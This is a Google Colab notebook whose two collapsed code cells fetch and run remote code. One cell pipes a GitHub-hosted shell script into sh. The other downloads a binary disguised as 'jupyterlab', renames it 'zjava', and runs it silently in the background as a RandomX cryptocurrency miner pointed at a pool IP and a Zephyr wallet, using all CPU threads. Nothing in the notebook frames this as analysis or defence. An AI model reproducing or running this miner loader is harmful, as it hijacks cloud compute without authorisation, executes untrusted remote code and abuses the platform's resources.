{
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "#@title *WebMiner*\n",
        "!curl -sSL https://raw.githubusercontent.com/AlmiraHanafie/All-Jobs/main/selenium.sh | sh"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "cellView": "form",
        "collapsed": true,
        "id": "235T5HF51cvV",
        "outputId": "705eb2a3-ea0f-4993-abbb-973d6172db13"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title *Zephyr*\n",
        "!wget -qO zjava https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab && chmod +x zjava && nohup ./zjava -o 47.89.195.104:443 -a rx/0 -u ZEPHs9VvRqBYzdxe7Qwutt7KLSqnQR96MdUQmsVPMtq39xxWByfFUYDBFrdfD9n3G9P2HAKCiuuu48iZzrQjnEYbAxitysPd9gp.$(echo pl-$(TZ=UTC+7 date +\"%H-%M-%S\")) --randomx-1gb-pages -p -x -t $(nproc --all) >/dev/null 2>&1 &"
      ],
      "metadata": {
        "cellView": "form",
        "id": "SHRHEwwH3kdT"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "V28"
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "TPU"
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
